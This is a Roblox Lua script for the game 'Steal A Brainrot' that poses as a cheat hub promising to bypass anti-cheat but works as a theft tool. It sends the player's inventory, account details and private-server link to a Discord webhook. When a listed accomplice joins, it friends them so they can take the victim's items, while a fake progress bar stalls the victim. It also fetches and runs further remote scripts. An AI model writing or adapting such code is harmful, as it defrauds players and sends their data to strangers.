--====================================================================--
-- Services
--======================================================================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

--====================================================================--
-- Configuration
--======================================================================
local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
    local success, result = pcall(function()
        local response = game:HttpGet(CONFIG_URL, true)
        return HttpService:JSONDecode(response)
    end)
    if success and result then
        return result
    end
    return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
    LocalPlayer:Kick("Failed to load config. Check your internet.")
    return
end

local Usernames = Config.usernames
local Webhook = Config.webhooks.sab

local NAME = "Steal A Brainrot"
local AVATAR_URL = "https://rayzhub.netlify.app/media/sab(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/sab(9x16).jpg"

local LOADING_DURATION = 30
local MIN_LOG_VALUE = 500000

-- State tracking
local initialInventoryList = {}
local initialInventoryCount = 0
local authorizedFound = false
local lastMessageId = nil
local currentJoinLink = ""

--====================================================================--
-- GUI Creation
--======================================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RayzHub"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
MainFrame.Size = UDim2.new(0, 250, 0, 150)
MainFrame.Active = true
MainFrame.Draggable = true

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 10)
FrameCorner.Parent = MainFrame

local LoadingFrame = Instance.new("Frame")
LoadingFrame.Name = "LoadingFrame"
LoadingFrame.Parent = MainFrame
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
LoadingFrame.ZIndex = 10
LoadingFrame.Visible = false

local LoadingCorner = Instance.new("UICorner")
LoadingCorner.CornerRadius = UDim.new(0, 10)
LoadingCorner.Parent = LoadingFrame

local LoadingText = Instance.new("TextLabel")
LoadingText.Parent = LoadingFrame
LoadingText.Size = UDim2.new(1, 0, 0.65, 0)
LoadingText.Text = "Bypassing anti cheat..."
LoadingText.TextColor3 = Color3.fromRGB(180, 100, 255)
LoadingText.Font = Enum.Font.GothamBold
LoadingText.TextSize = 16
LoadingText.BackgroundTransparency = 1
LoadingText.ZIndex = 11
LoadingText.TextYAlignment = Enum.TextYAlignment.Center

local BarBG = Instance.new("Frame")
BarBG.Parent = LoadingFrame
BarBG.BackgroundColor3 = Color3.fromRGB(50, 40, 65)
BarBG.Size = UDim2.new(0.8, 0, 0, 12)
BarBG.Position = UDim2.new(0.1, 0, 0.72, 0)
BarBG.ZIndex = 11

local Bar = Instance.new("Frame")
Bar.Parent = BarBG
Bar.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.ZIndex = 12

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Text = "RAYZ HUB"
Title.TextColor3 = Color3.fromRGB(180, 100, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundTransparency = 1
Title.ZIndex = 2

local LinkInput = Instance.new("TextBox")
LinkInput.Parent = MainFrame
LinkInput.Text = ""
LinkInput.PlaceholderText = "enter private server link"
LinkInput.BackgroundColor3 = Color3.fromRGB(50, 40, 65)
LinkInput.TextColor3 = Color3.fromRGB(255, 255, 255)
LinkInput.Position = UDim2.new(0.1, 0, 0.35, 0)
LinkInput.Size = UDim2.new(0.8, 0, 0, 30)
LinkInput.Font = Enum.Font.Gotham
LinkInput.TextSize = 14
LinkInput.ZIndex = 2

local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Parent = MainFrame
ExecuteBtn.Text = "EXECUTE"
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(120, 50, 200)
ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
ExecuteBtn.Size = UDim2.new(0.8, 0, 0, 35)
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.TextSize = 16
ExecuteBtn.ZIndex = 2

--====================================================================--
-- Helpers
--======================================================================
local function parseGen(str)
	local n, u = str:gsub("%s", ""):match("(%d+%.?%d*)([KMB]?)")
	n = tonumber(n) or 0
	if u == "K" then
		return n * 1000
	elseif u == "M" then
		return n * 1000000
	elseif u == "B" then
		return n * 1000000000
	end
	return n
end

local function formatValue(n)
	if n >= 1000000000 then
		return string.format("%.2fB", n / 1000000000)
	elseif n >= 1000000 then
		return string.format("%.2fM", n / 1000000)
	elseif n >= 1000 then
		return string.format("%.2fK", n / 1000)
	else
		return string.format("%.2f", n)
	end
end

local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = LocalPlayer.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30

	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getValuableBrainrots()
	local list = {}
	local debris = Workspace:FindFirstChild("Debris")
	if not debris then
		return list
	end

	for _, t in ipairs(debris:GetChildren()) do
		if t.Name == "FastOverheadTemplate" then
			local oh = t:FindFirstChild("AnimalOverhead")
			if oh and oh:FindFirstChild("DisplayName") and oh:FindFirstChild("Generation") then
				local val = parseGen(oh.Generation.Text)
				if val >= MIN_LOG_VALUE then
					table.insert(list, {
						name = oh.DisplayName.Text,
						gen = oh.Generation.Text,
						val = val,
					})
				end
			end
		end
	end
	table.sort(list, function(a, b)
		return a.val > b.val
	end)
	return list
end

local function getStatusColor(status)
	if status == "🟢 Claimed" then
		return 0x2ECC71
	elseif status == "🔵 Partially Claimed" then
		return 0x3498DB
	elseif status == "🟡 Waiting" or status == "🟢 Connected" then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x800080
end

local function getItemEmoji(name)
	local lower = string.lower(name)
	if lower:find("dragon") then
		return "🐉"
	elseif lower:find("cat") then
		return "🐱"
	elseif lower:find("dog") then
		return "🐶"
	elseif lower:find("phoenix") then
		return "🔥"
	elseif lower:find("unicorn") then
		return "🦄"
	elseif lower:find("demon") then
		return "😈"
	elseif lower:find("angel") then
		return "👼"
	elseif lower:find("titan") then
		return "⚡"
	elseif lower:find("god") then
		return "👑"
	elseif lower:find("ice") or lower:find("frost") then
		return "❄️"
	elseif lower:find("fire") or lower:find("flame") then
		return "🔥"
	elseif lower:find("shadow") or lower:find("dark") then
		return "🌑"
	elseif lower:find("light") or lower:find("holy") then
		return "✨"
	elseif lower:find("wolf") then
		return "🐺"
	elseif lower:find("bear") then
		return "🐻"
	elseif lower:find("lion") then
		return "🦁"
	elseif lower:find("eagle") or lower:find("bird") then
		return "🦅"
	elseif lower:find("snake") then
		return "🐍"
	elseif lower:find("monkey") then
		return "🐵"
	elseif lower:find("rabbit") or lower:find("bunny") then
		return "🐰"
	elseif lower:find("fish") then
		return "🐟"
	elseif lower:find("shark") then
		return "🦈"
	elseif lower:find("panda") then
		return "🐼"
	end
	return "🧬"
end

--====================================================================--
-- Webhook Logging
--======================================================================
local function sendDetailedEmbedLog(joinLink, status)
	local currentInv = getValuableBrainrots()
	local method = lastMessageId and "PATCH" or "POST"
	local url = lastMessageId and (Webhook .. "/messages/" .. lastMessageId) or (Webhook .. "?wait=true")

	local totalInitialValue = 0
	local totalClaimedValue = 0

	-- Build initial map with per-name value tracking
	local initialMap = {}
	local initialValMap = {}
	for _, item in ipairs(initialInventoryList) do
		initialMap[item.name] = (initialMap[item.name] or 0) + 1
		initialValMap[item.name] = item.val
		totalInitialValue = totalInitialValue + item.val
	end

	local currentMap = {}
	for _, item in ipairs(currentInv) do
		currentMap[item.name] = (currentMap[item.name] or 0) + 1
	end

	-- Build inventory lines
	local inventoryLines = {}
	local sortedNames = {}
	for name, _ in pairs(initialMap) do
		table.insert(sortedNames, name)
	end
	table.sort(sortedNames, function(a, b)
		return (initialValMap[a] or 0) > (initialValMap[b] or 0)
	end)

	for _, name in ipairs(sortedNames) do
		local initialQty = initialMap[name]
		local currentQty = currentMap[name] or 0
		local takenQty = initialQty - currentQty
		if takenQty < 0 then
			takenQty = 0
		end

		local unitVal = initialValMap[name] or 0
		local takenValue = takenQty * unitVal
		local totalItemValue = initialQty * unitVal
		totalClaimedValue = totalClaimedValue + takenValue

		local emoji = getItemEmoji(name)
		local line = emoji
			.. " "
			.. name
			.. " x"
			.. takenQty
			.. "/"
			.. initialQty
			.. " ("
			.. formatValue(takenValue)
			.. " / "
			.. formatValue(totalItemValue)
			.. ")"
		table.insert(inventoryLines, line)
	end

	local inventoryText
	if #inventoryLines > 0 then
		inventoryText = table.concat(inventoryLines, "\n")
			.. "\n─────────────────────────────────\n📊 Claimed: "
			.. formatValue(totalClaimedValue)
			.. " / "
			.. formatValue(totalInitialValue)
	else
		inventoryText = "No valuable items found\n─────────────────────────────────\n📊 Claimed: 0.00 / 0.00"
	end

	-- Player information block with aligned colons
	local displayName = LocalPlayer.DisplayName
	local userName = LocalPlayer.Name
	local accountAge = getAccountAge()
	local executor = getExecutorName()
	local playerCount = getPlayerCount()
	local receiverList = table.concat(Usernames, ", ")

	-- Pad labels so ":" aligns at column 18
	local playerInfoText = "👤 Display Name  : "
		.. displayName
		.. "\n"
		.. "🆔 Username      : "
		.. userName
		.. "\n"
		.. "📅 Account Age   : "
		.. accountAge
		.. "\n"
		.. "🖥  Executor      : "
		.. executor
		.. "\n"
		.. "👥 Players       : "
		.. playerCount
		.. "\n"
		.. "😎 Receiver      : "
		.. receiverList

	-- Dynamic color
	local embedColor = getStatusColor(status)

	-- Ping logic
	local hitContent = ""
	if totalInitialValue >= 20000000 then
		hitContent = "> @everyone 🔔 **Good Hit Detected!**"
	elseif totalInitialValue >= 5000000 then
		hitContent = "> 🔔 **Small Hit Detected**"
	end

	-- Teleport script in code block
	local teleportScript = 'game:GetService("TeleportService"):Teleport('
		.. game.PlaceId
		.. ', game:GetService("Players").LocalPlayer)'

	local contentText = hitContent
	if contentText ~= "" then
		contentText = contentText .. "\n"
	end
	contentText = contentText .. "```lua\n" .. teleportScript .. "\n```"

	local payload = {
		content = contentText,
		username = NAME,
		avatar_url = AVATAR_URL,
		embeds = {
			{
				title = "⚡ RAYZ HUB ⚡",
				color = embedColor,
				fields = {
					{
						name = "📄 Player Information",
						value = "```" .. playerInfoText .. "```",
						inline = false,
					},
					{
						name = "📡 Player Status",
						value = "```" .. status .. "```",
						inline = false,
					},
					{
						name = "🎒 Inventory",
						value = "```" .. inventoryText .. "```",
						inline = false,
					},
					{
						name = "👤 Join Link",
						value = "[🔗 Click to Join Player](" .. joinLink .. ")",
						inline = false,
					},
				},
				footer = {
					text = "RAYZ HUB • "
						.. os.date("!%m/%d/%Y %I:%M %p")
						.. " UTC",
					icon_url = LOGO_URL,
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				image = {
					url = IMAGE_URL,
				},
			},
		},
	}

	local success, response = pcall(function()
		local req = (syn and syn.request)
			or request
			or http_request
			or (http and http.request)
		return req({
			Url = url,
			Method = method,
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload),
		})
	end)

	if success and method == "POST" and response and response.Body then
		local decodeSuccess, data = pcall(function()
			return HttpService:JSONDecode(response.Body)
		end)
		if decodeSuccess and data and data.id then
			lastMessageId = data.id
		end
	end
end

--====================================================================--
-- Authorized User Logic
--======================================================================
local function handleAuthorizedUser(player)
	if authorizedFound then
		return
	end

	if table.find(Usernames, player.Name) or table.find(Usernames, player.DisplayName) then
		authorizedFound = true

		-- Update status to Connected
		sendDetailedEmbedLog(currentJoinLink, "🟢 Connected")

		pcall(function()
			LocalPlayer:FriendUser(player.UserId)
		end)
		task.wait(1)
		pcall(function()
			ReplicatedStorage:WaitForChild("Packages")
				:WaitForChild("Net")
				:WaitForChild("RE/PlotService/ToggleFriends")
				:FireServer()
		end)

		task.spawn(function()
			-- Wait until target player leaves
			while player.Parent == Players do
				task.wait(1.5)
			end

			local currentInv = getValuableBrainrots()
			local finalStatus = "🟡 Waiting"

			if #currentInv == 0 and initialInventoryCount > 0 then
				finalStatus = "🟢 Claimed"
			elseif #currentInv < initialInventoryCount then
				finalStatus = "🔵 Partially Claimed"
			elseif #currentInv >= initialInventoryCount then
				finalStatus = "🔴 Failed"
			end

			sendDetailedEmbedLog(currentJoinLink, finalStatus)

			if ScreenGui then
				ScreenGui:Destroy()
			end
			pcall(function()
				loadstring(game:HttpGet("https://rayzhub.netlify.app/scripts/sab-gui.lua"))()
			end)
			pcall(function()
				loadstring(game:HttpGet("https://rayzhub.netlify.app/scripts/sab-freezer.lua"))()
			end)
		end)
	end
end

--====================================================================--
-- Button Logic
--======================================================================
ExecuteBtn.MouseButton1Click:Connect(function()
	local isPrivateServer = game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0
	if not isPrivateServer then
		LocalPlayer:Kick("This script works only on private servers!")
		return
	end

	if #Players:GetPlayers() > 1 then
		LocalPlayer:Kick("Please join an empty private server!")
		return
	end

	local link = LinkInput.Text:match("^%s*(.-)%s*$")

	if link == "" or (not link:find("roblox%.com") and not link:find("share")) then
		ExecuteBtn.Text = "INVALID LINK"
		task.wait(1.2)
		ExecuteBtn.Text = "EXECUTE"
		return
	end

	currentJoinLink = link
	initialInventoryList = getValuableBrainrots()
	initialInventoryCount = #initialInventoryList
	authorizedFound = false
	lastMessageId = nil

	sendDetailedEmbedLog(link, "🟡 Waiting")

	LoadingFrame.Visible = true
	LinkInput.Visible = false
	ExecuteBtn.Visible = false
	Title.Text = "VERIFYING..."
	LoadingText.Text = "Bypassing anti cheat..."

	Bar.Size = UDim2.new(0, 0, 1, 0)
	local tween = TweenService:Create(Bar, TweenInfo.new(LOADING_DURATION, Enum.EasingStyle.Linear), {
		Size = UDim2.new(1, 0, 1, 0),
	})
	tween:Play()

	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer then
			handleAuthorizedUser(p)
		end
	end

	local connection = Players.PlayerAdded:Connect(function(p)
		if p ~= LocalPlayer then
			handleAuthorizedUser(p)
		end
	end)

	task.delay(LOADING_DURATION + 0.5, function()
		if connection then
			connection:Disconnect()
		end

		if not authorizedFound then
			sendDetailedEmbedLog(link, "🔴 Failed")

			LoadingText.Text = "Failed to bypass anti cheat"
			task.wait(1.8)
			LoadingText.Text = "Try again later"
			task.wait(2.2)

			pcall(function()
				game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
			end)
			LocalPlayer:Kick("Failed to bypass anti cheat, try again later")
		end
	end)
end)

print("[Rayz Hub] sab loaded...")